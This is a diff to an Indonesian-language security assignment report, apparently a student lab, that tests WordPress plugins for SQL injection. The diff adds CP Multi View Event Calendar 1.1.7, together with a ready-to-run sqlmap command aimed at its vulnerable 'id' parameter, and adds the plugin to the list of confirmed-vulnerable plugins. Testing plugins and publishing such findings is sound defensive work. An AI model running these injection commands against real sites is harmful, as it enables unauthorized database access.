@@ -30,6 +30,9 @@ Merupakan plugin yang digunakan untuk mengatur dan menampilkan hasil dari pertan
 #### 3. Simply Poll 1.4.1
 Merupakan plugin yang digunakan untuk membuat poll pada Wordpress website. Poll yang dibuat dapat ditampilkan pada sidebar, post, maupun pages dari website. Plugin ini dapat diunduh pada https://wordpress.org/plugins/simply-polls/
 
+#### 4. CP Multi View Event Calendar 1.1.7
+CP Multi View Event Calendar merupakan event kalender untuk website wordpress yang menampilkan beberapa mode visualisasi dan beberapa gaya standar
+
 ### Tools yang Digunakan
 
 #### 1. WPScan
@@ -132,6 +135,16 @@ python sqlmap -u "http://alamat_site/wp-admin/admin-ajax.php"  --data="action=sp
 ![simplypol 9](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll9.png)
 ![simplypol 10](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll10.png)
 
+#### Plugin - CP Multi View Event Calendar 1.1.7
+- Buka terminal pada folder dimana sqlmap berada, jalankan perintah:<pre>
+python sqlmap.py --url "http://alamat_site?action=data_management&cpmvc_do_action=mvparse&f=edit&id=1" --level=5 --risk=3 --dbms=mysql --tables -p id
+</pre>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
+
+![cpmulti 1](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/cpmulti1.png)
+![simplypol 6](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll6.png)
+![simplypol 7](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll7.png)
+
 #### Plugin - League Manager 3.9.11
 - Buka terminal pada folder dimana sqlmap berada, jalankan perintah:<pre>
 python sqlmap.py --url "http://alamat_site?match=1" --level 5 --risk 3 --dbms mysql --tables
@@ -182,6 +195,7 @@ Dari hasil uji coba yang dilakukan, kami memastikan bahwa plugin-plugin dibawah 
   1. **League Manager**
   2. **Spider Video Player**
   3. **Simply Poll**
+  4. **CP Multi View Event Calendar**
 
 ### Saran
 Dapat diketahui bahwa terbukti beberapa plugin pada wordpress tidak sepenuhnya aman terhadap serangan. Ada baiknya kita menghindari penggunaan plugin tersebut dengan plugin lain yang lebih aman. Jika diperlukan, anda juga dapat memberikan akses keamanan tambahan terhadap web milik anda.
